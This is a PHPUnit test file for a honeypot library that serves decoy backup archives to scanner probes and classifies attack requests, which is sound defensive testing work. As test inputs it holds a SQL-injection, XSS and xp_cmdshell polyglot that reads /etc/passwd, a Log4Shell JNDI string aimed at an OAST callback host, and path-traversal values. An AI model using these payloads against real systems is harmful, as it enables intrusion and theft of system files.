<?php

declare(strict_types=1);

namespace Funnypot\Core\Tests\Decoy;

use Funnypot\Core\Config;
use Funnypot\Core\Detection;
use Funnypot\Core\FakeHandle;
use Funnypot\Core\Honeypot;
use Funnypot\Core\Observer;
use Funnypot\Core\Outcome;
use Funnypot\Core\RequestContext;
use Funnypot\Core\SiteProfile;
use Funnypot\Core\Store\PhpArrayStore;
use Funnypot\Core\SynthesizedResponse;
use Funnypot\Core\Verdict;
use PHPUnit\Framework\TestCase;

final class DecoyArchiveServeTest extends TestCase
{
    /** @var array<string,mixed>|null */
    private static $small;

    /** @var array<string,mixed>|null */
    private static $full;

    private const WAF_POLYGLOT = 'AND 1=1 UNION ALL SELECT 1,NULL,\'<script>alert("XSS")</script>\',table_name'
        . ' FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell(\'cat ../../../etc/passwd\')#';

    private function engine(bool $decoys = true, bool $anyName = false, ?Observer $observer = null, bool $fullStore = false, bool $attacks = false): Honeypot
    {
        if ($fullStore) {
            self::$full = self::$full ?? require __DIR__ . '/../../resources/compiled/nuclei-index.full.php';
            $idx = self::$full;
        } else {
            self::$small = self::$small ?? require __DIR__ . '/../../resources/compiled/nuclei-index.php';
            $idx = self::$small;
        }
        $cfg = new Config('respond', static function (RequestContext $r): bool { return true; });
        $cfg->decoyArchives = $decoys;
        $cfg->decoyArchiveAnyName = $anyName;
        $cfg->attackEmulation = $attacks;

        return new Honeypot(new PhpArrayStore($idx), $cfg, $observer);
    }

    private function req(string $path, string $method = 'GET', string $query = '', array $headers = []): RequestContext
    {
        return new RequestContext($method, $path, $query, $headers, null, 'x.test');
    }

    public function test_flag_off_keeps_the_host_404(): void
    {
        self::assertNull($this->engine(false)->respond($this->req('/backup.zip')));
    }

    public function test_backup_zip_is_served_with_download_headers(): void
    {
        $observer = new RecordingObserver();
        $r = $this->engine(true, false, $observer)->respond($this->req('/backup22.zip'));

        self::assertInstanceOf(SynthesizedResponse::class, $r);
        self::assertSame(200, $r->status);
        self::assertSame('application/zip', $r->headers['Content-Type']);
        self::assertSame('attachment; filename="backup22.zip"', $r->headers['Content-Disposition']);
        self::assertSame((string) strlen($r->body), $r->headers['Content-Length']);
        self::assertSame("PK\x03\x04", substr($r->body, 0, 4));
        self::assertGreaterThan(900000, strlen($r->body));
        self::assertSame([Outcome::SERVED], $observer->outcomes);
        self::assertSame([['decoy-backup-archive']], $observer->detectionIds, 'a backup-archive fetch is a scanner probe');
    }

    public function test_it_classifies_as_a_low_severity_scanner_probe(): void
    {
        $v = $this->engine()->classify($this->req('/www.tar.gz'), SiteProfile::empty());
        self::assertSame(Verdict::SCANNER_PROBE, $v->classification);
        self::assertSame('low', $v->severity);
        self::assertSame(['decoy-backup-archive'], $v->detection->templateIds());
    }

    public function test_out_of_band_signals_fold_onto_the_decoy_and_still_fire(): void
    {
        $observer = new RecordingObserver();
        $r = $this->engine(true, false, $observer)->respond($this->req(
            '/backup.zip', 'GET', 'u=' . rawurlencode('http://abc.oast.fun/x'), ['user-agent' => '${jndi:ldap://x.oast.fun/a}']
        ));
        self::assertNotNull($r);
        self::assertCount(1, $observer->detectionIds);
        self::assertContains('decoy-backup-archive', $observer->detectionIds[0]);
        self::assertContains('oast-callback', $observer->detectionIds[0]);
    }

    public function test_waf_check_polyglot_gets_the_same_decoy_as_the_plain_request(): void
    {
        $engine = $this->engine(true, false, null, false, true);
        $plain = $engine->respond($this->req('/backup.zip'));
        $poly = $engine->respond($this->req('/backup.zip', 'GET', 'id=' . rawurlencode(self::WAF_POLYGLOT)));
        self::assertNotNull($plain);
        self::assertNotNull($poly, 'the polyglot must not split 200 vs 404 on a decoy path');
        self::assertSame($plain->body, $poly->body);
    }

    public function test_an_attack_rule_on_the_same_path_still_wins(): void
    {
        $v = $this->engine(true, false, null, false, true)
            ->classify($this->req('/backup.zip', 'GET', 'file=../../../../etc/passwd'), SiteProfile::empty());
        self::assertSame(Verdict::ATTACK_CLASS, $v->classification);
        self::assertNotSame(FakeHandle::KIND_DECOY_ARCHIVE, $v->fakeHandle === null ? null : $v->fakeHandle->kind);
    }

    public function test_a_stored_handle_serves_nothing_once_the_flag_is_off(): void
    {
        $h = FakeHandle::decoyArchive('zip', 'backup');
        self::assertNull($this->engine(false)->synthesizeFromHandle($h, SiteProfile::empty(), 'seed'));
    }

    public function test_head_gets_headers_and_length_without_a_body(): void
    {
        $engine = $this->engine();
        $get = $engine->respond($this->req('/www.tar.gz'));
        $head = $engine->respond($this->req('/www.tar.gz', 'HEAD'));
        self::assertNotNull($get);
        self::assertNotNull($head);
        self::assertSame('', $head->body);
        self::assertSame($get->headers['Content-Length'], $head->headers['Content-Length']);
        self::assertSame('application/gzip', $head->headers['Content-Type']);
    }

    public function test_non_backup_names_and_other_methods_fall_through(): void
    {
        $engine = $this->engine();
        self::assertNull($engine->respond($this->req('/assets/logo-pack.zip')));
        self::assertNull($engine->respond($this->req('/backup.rar')));
        self::assertNull($engine->respond($this->req('/backup.zip', 'POST')));
    }

    public function test_any_name_flag_widens_matching(): void
    {
        self::assertNotNull($this->engine(true, true)->respond($this->req('/assets/logo-pack.zip')));
    }

    public function test_a_host_route_is_never_shadowed(): void
    {
        $profile = new SiteProfile([], static function (string $m, string $p): bool { return $p === '/backup.zip'; });
        $v = $this->engine()->classify($this->req('/backup.zip'), $profile);
        self::assertNull($v->fakeHandle);
        self::assertSame(Verdict::CLEAN, $v->classification);

        $v = $this->engine()->classify($this->req('/backup.zip'), SiteProfile::empty());
        self::assertNotNull($v->fakeHandle);
        self::assertSame(FakeHandle::KIND_DECOY_ARCHIVE, $v->fakeHandle->kind);
    }

    public function test_an_existing_corpus_route_still_wins(): void
    {
        $path = '/wp-content/uploads/tmm_db_migrate/tmm_db_migrate.zip';
        $v = $this->engine(true, true, null, true)->classify($this->req($path), SiteProfile::empty());
        self::assertNotNull($v->fakeHandle);
        self::assertSame(FakeHandle::KIND_ROUTE, $v->fakeHandle->kind);
    }

    public function test_handle_round_trips_and_forged_keys_decline(): void
    {
        $engine = $this->engine();
        $h = FakeHandle::fromArray(FakeHandle::decoyArchive('tgz', 'site_old')->toArray());
        self::assertSame(FakeHandle::KIND_DECOY_ARCHIVE, $h->kind);
        self::assertNotNull($engine->synthesizeFromHandle($h, SiteProfile::empty(), 'seed'));

        foreach (['rar|backup', 'zip|../etc', 'zip|', 'zip', 'zip|A B', 'tar|..', 'zip|-x', 'zip|.hidden'] as $key) {
            $forged = new FakeHandle(FakeHandle::KIND_DECOY_ARCHIVE, $key);
            self::assertNull($engine->synthesizeFromHandle($forged, SiteProfile::empty(), 'seed'), $key);
        }
    }

    public function test_a_plain_miss_still_has_no_handle(): void
    {
        $v = $this->engine()->classify($this->req('/nothing-here.html'), SiteProfile::empty());
        self::assertNull($v->fakeHandle);
    }
}

final class RecordingObserver implements Observer
{
    /** @var list<string> */
    public $outcomes = [];

    /** @var list<list<string>> */
    public $detectionIds = [];

    public function onDetection(RequestContext $r, Detection $detection): void
    {
        $this->detectionIds[] = $detection->templateIds();
    }

    public function shouldRespond(RequestContext $r, Detection $detection): bool
    {
        return true;
    }

    public function onOutcome(RequestContext $r, ?SynthesizedResponse $response, string $reason): void
    {
        $this->outcomes[] = $reason;
    }
}
